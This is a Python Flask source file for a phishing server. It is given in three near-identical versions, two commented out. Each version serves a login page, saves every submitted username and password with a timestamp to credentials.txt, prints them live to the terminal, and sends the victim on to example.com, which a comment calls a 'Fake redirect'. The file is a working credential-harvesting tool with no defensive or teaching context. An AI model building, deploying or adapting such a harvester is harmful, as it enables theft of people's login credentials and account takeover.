# from flask import Flask, request, redirect, render_template_string
# from datetime import datetime

# app = Flask(__name__)

# login_page = open("login.html").read()

# @app.route("/", methods=["GET"])
# def home():
#     return render_template_string(login_page)

# @app.route("/login", methods=["POST"])
# def login():
#     username = request.form.get("username")
#     password = request.form.get("password")
#     with open("credentials.txt", "a") as file:
#         file.write(f"User: {username} | Pass: {password} | Time: {datetime.now()}\n")
#     return redirect("https://example.com")

# if __name__ == "__main__":
#     app.run(host="0.0.0.0", port=8080)



# from flask import Flask, request, redirect, render_template_string
# from datetime import datetime

# app = Flask(__name__)

# login_page = open("login.html").read()

# @app.route("/", methods=["GET"])
# def home():
#     return render_template_string(login_page)

# @app.route("/login", methods=["POST"])
# def login():
#     username = request.form.get("username")
#     password = request.form.get("password")
#     log_entry = f"[+] User: {username} | Pass: {password} | Time: {datetime.now()}"
#     print(log_entry)  # Show in terminal
#     with open("credentials.txt", "a") as file:
#         file.write(log_entry + "\n")
#     return redirect("https://example.com")  # Fake redirect

# if __name__ == "__main__":
#     app.run(host="0.0.0.0", port=8080)


from flask import Flask, request, redirect, render_template_string
from datetime import datetime

app = Flask(__name__)

@app.route("/", methods=["GET"])
def home():
    with open("login.html", "r") as file:
        login_page = file.read()
    return render_template_string(login_page)


@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    log_entry = f"[+] User: {username} | Pass: {password} | Time: {datetime.now()}"
    print(log_entry)  # Show live in terminal
    with open("credentials.txt", "a") as file:
        file.write(log_entry + "\\n")
    return redirect("https://example.com")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
